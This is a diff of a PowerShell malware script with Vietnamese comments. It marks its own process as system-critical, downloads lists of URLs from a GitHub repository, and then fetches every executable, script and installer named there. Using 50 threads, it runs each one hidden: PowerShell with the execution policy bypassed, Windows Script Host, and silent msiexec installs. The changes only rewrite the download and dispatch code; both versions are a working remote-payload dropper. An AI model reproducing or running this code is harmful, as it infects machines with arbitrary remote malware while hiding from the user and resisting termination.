@@ -25,88 +25,75 @@ function CriticalProcess {
     }
 }
 CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
-# 1. Nguồn URL từ list bạn đã check
+# 1. Cấu hình nguồn list đã check của bạn
 $sources = @(
     "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
     "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt"
 )
 
-# Extension hỗ trợ
-$extensions = ".exe", ".com", ".bat", ".cmd", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".msc", ".msi", ".msp", ".scr", ".ps1", ".pif", ".cpl"
+# Các định dạng hỗ trợ chạy trên Windows
+$exts = ".exe", ".com", ".bat", ".cmd", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".msc", ".msi", ".msp", ".scr", ".ps1", ".pif", ".cpl"
 
-Write-Host "[*] Đang thu thập và lọc trùng từ GitHub..." -ForegroundColor Cyan
+Write-Host "[*] Dang lay du lieu tu GitHub..." -ForegroundColor Cyan
 
-# Cách lấy dữ liệu an toàn, tránh lỗi Empty Pipe
-$allUrls = @()
-foreach ($s in $sources) {
-    try {
-        $content = (Invoke-WebRequest -Uri $s -UseBasicParsing -TimeoutSec 10).Content
-        if ($content) {
-            $allUrls += $content -split "`n" | ForEach-Object { $_.Trim() }
-        }
-    } catch { }
+# 2. Thu thập và Lọc trùng (Fix lỗi Empty Pipe bằng cách dùng biến trung gian)
+$raw = foreach ($s in $sources) {
+    try { (New-Object System.Net.WebClient).DownloadString($s) -split "`n" } catch { }
 }
-
-# Lọc trùng và kiểm tra đuôi file hợp lệ
-$finalList = $allUrls | Where-Object { 
-    $url = $_
-    $url -ne "" -and ($extensions | Where-Object { $url.ToLower().EndsWith($_) })
+$urlList = $raw | ForEach-Object { $_.Trim() } | Where-Object { 
+    $u = $_
+    $u -ne "" -and ($exts | Where-Object { $u.ToLower().EndsWith($_) })
 } | Select-Object -Unique
 
-Write-Host "[*] Tổng cộng $($finalList.Count) link duy nhất. Đang chạy 50 tầng (threads)..." -ForegroundColor Green
+Write-Host "[*] Tim thay $($urlList.Count) link duy nhat. Dang chay 50 luong..." -ForegroundColor Green
 
-# 2. Thiết lập Runspace Pool (Multi-threading)
-$sessionState = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
-$pool = [runspacefactory]::CreateRunspacePool(1, 50, $sessionState, $Host)
+# 3. Thiet lap Runspace Pool (50 luong song song)
+$iss = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
+$pool = [runspacefactory]::CreateRunspacePool(1, 50, $iss, $Host)
 $pool.Open()
-$threads = New-Object System.Collections.Generic.List[PSObject]
+$jobs = New-Object System.Collections.Generic.List[PSObject]
 
-# 3. Đẩy tác vụ vào luồng
-foreach ($u in $finalList) {
-    $powershell = [powershell]::Create().AddScript({
-        param($url)
+# 4. Day tac vu vao luong
+foreach ($url in $urlList) {
+    $ps = [powershell]::Create().AddScript({
+        param($u, $extensions)
         try {
-            # Xử lý tên file và đường dẫn TEMP
-            $cleanUrl = $url.Split('?')[0]
-            $fileName = [System.IO.Path]::GetFileName($cleanUrl)
-            $path = Join-Path $env:TEMP $fileName
+            $cleanUrl = $u.Split('?')[0]
+            $name = [System.IO.Path]::GetFileName($cleanUrl)
+            $path = Join-Path $env:TEMP $name
             $ext = [System.IO.Path]::GetExtension($path).ToLower()
-            
-            # Tải xuống
-            Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
-            
-            # Logic thực thi theo loại file
-            switch ($ext) {
-                ".ps1" { 
-                    Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden 
-                }
-                { ".vbs", ".js", ".vbe", ".jse", ".wsf", ".wsh" -contains $_ } { 
-                    Start-Process "wscript.exe" -ArgumentList "`"$path`"" -WindowStyle Hidden 
-                }
-                { ".msi", ".msp" -contains $_ } { 
-                    Start-Process "msiexec.exe" -ArgumentList "/i `"$path`" /quiet /qn" -WindowStyle Hidden 
-                }
-                default { 
-                    Start-Process -FilePath $path -WindowStyle Hidden 
-                }
+
+            # Tai file bang WebClient (On dinh hon Invoke-WebRequest)
+            $wc = New-Object System.Net.WebClient
+            $wc.DownloadFile($u, $path)
+
+            # Thực thi thông minh theo đuôi file
+            if ($ext -eq ".ps1") {
+                Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
+            }
+            elseif (".vbs", ".js", ".vbe", ".jse", ".wsf", ".wsh" -contains $ext) {
+                Start-Process "wscript.exe" -ArgumentList "`"$path`"" -WindowStyle Hidden
+            }
+            elseif ($ext -eq ".msi" -or $ext -eq ".msp") {
+                Start-Process "msiexec.exe" -ArgumentList "/i `"$path`" /quiet /qn" -WindowStyle Hidden
+            }
+            else {
+                Start-Process -FilePath $path -WindowStyle Hidden
             }
         } catch { }
-    }).AddArgument($u)
+    }).AddArgument($url).AddArgument($exts)
 
-    $powershell.RunspacePool = $pool
-    $threads.Add((New-Object PSObject -Property @{
-        Instance = $powershell
-        Handle   = $powershell.BeginInvoke()
-    }))
+    $ps.RunspacePool = $pool
+    $jobs.Add((New-Object PSObject -Property @{ Instance = $ps; Handle = $ps.BeginInvoke() }))
 }
 
-# 4. Giám sát cho đến khi xong
-while ($threads.Handle.IsCompleted -contains $false) { Start-Sleep -Milliseconds 200 }
+# 5. Cho den khi xong va don dep
+while ($jobs.Handle.IsCompleted -contains $false) { Start-Sleep -Milliseconds 200 }
 
-# 5. Giải phóng
-foreach ($t in $threads) {
-    $t.Instance.EndInvoke($t.Handle)
-    $t.Instance.Dispose()
+foreach ($j in $jobs) {
+    $j.Instance.EndInvoke($j.Handle)
+    $j.Instance.Dispose()
 }
 $pool.Close()
-Write-Host "[+] HOÀN TẤT!" -ForegroundColor White
+
+Write-Host "[+] HOAN TAT TAT CA!" -ForegroundColor White
